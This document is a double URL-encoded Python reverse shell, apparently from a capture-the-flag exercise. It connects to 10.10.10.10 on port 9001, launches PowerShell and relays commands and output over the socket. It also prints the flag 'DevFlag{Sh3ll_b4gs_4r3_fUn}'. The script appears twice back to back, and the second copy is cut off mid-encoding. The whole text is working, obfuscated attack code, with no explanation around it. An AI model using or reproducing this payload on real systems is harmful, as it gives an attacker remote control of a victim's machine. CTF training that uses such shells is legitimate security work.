import%2520os%252Csocket%252Csubprocess%252Cthreading%253B%250Adef%2520s2p%2528s%252C%2520p%2529%253A%250A%2520%2520%2520%2520while%2520True%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520data%2520%253D%2520s.recv%25281024%2529%250A%2520%2520%2520%2520%2520%2520%2520%2520if%2520len%2528data%2529%2520%253E%25200%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520p.stdin.write%2528data%2529%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520p.stdin.flush%2528%2529%250A%250Adef%2520p2s%2528s%252C%2520p%2529%253A%250A%2520%2520%2520%2520while%2520True%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520s.send%2528p.stdout.read%25281%2529%2529%250A%250As%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%250As.connect%2528%2528%252210.10.10.10%2522%252C9001%2529%2529%250A%250Ap%253Dsubprocess.Popen%2528%255B%2522powershell%2522%255D%252C%2520stdout%253Dsubprocess.PIPE%252C%2520stderr%253Dsubprocess.STDOUT%252C%2520stdin%253Dsubprocess.PIPE%2529%250A%250As2p_thread%2520%253D%2520threading.Thread%2528target%253Ds2p%252C%2520args%253D%255Bs%252C%2520p%255D%2529%250As2p_thread.daemon%2520%253D%2520True%250As2p_thread.start%2528%2529%250A%250Ap2s_thread%2520%253D%2520threading.Thread%2528target%253Dp2s%252C%2520args%253D%255Bs%252C%2520p%255D%2529%250Ap2s_thread.daemon%2520%253D%2520True%250Ap2s_thread.start%2528%2529%250A%250Atry%253A%250A%2520%2520%2520%2520p.wait%2528%2529%250A%2520%2520%2520%2520p.print%2528%2522DevFlag%257BSh3ll_b4gs_4r3_fUn%257D%2522%2529%250Aexcept%2520KeyboardInterrupt%253A%250A%2520%2520%2520%2520s.close%2528%2529import%2520os%252Csocket%252Csubprocess%252Cthreading%253B%250Adef%2520s2p%2528s%252C%2520p%2529%253A%250A%2520%2520%2520%2520while%2520True%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520data%2520%253D%2520s.recv%25281024%2529%250A%2520%2520%2520%2520%2520%2520%2520%2520if%2520len%2528data%2529%2520%253E%25200%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520p.stdin.write%2528data%2529%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520p.stdin.flush%2528%2529%250A%250Adef%2520p2s%2528s%252C%2520p%2529%253A%250A%2520%2520%2520%2520while%2520True%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520s.send%2528p.stdout.read%25281%2529%2529%250A%250As%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%250As.connect%2528%2528%252210.10.10.10%2522%252C9001%2529%2529%250A%250Ap%253Dsubprocess.Popen%2528%255B%2522powershell%2522%255D%252C%2520stdout%253Dsubprocess.PIPE%252C%2520stderr%253Dsubprocess.STDOUT%252C%2520stdin%253Dsubprocess.PIPE%2529%250A%250As2p_thread%2520%253D%2520threading.Thread%2528target%253Ds2p%252C%2520args%253D%255Bs%252C%2520p%255D%2529%250As2p_thread.daemon%2520%253D%2520True%250As2p_thread.start%2528%2529%250A%250Ap2s_thread%2520%253D%2520threading.Thread%2528target%253Dp2s%252C%2520args%253D%255Bs%252C%2520p%255D%2529%250Ap2s_thread.daemon%2520%253D%2520True%250Ap2s_thread.start%2528%2529%250A%250Atry%253A%250A%2520%2520%2520%2520p.wait%2528%2529%250A%2520%2520%2520%252
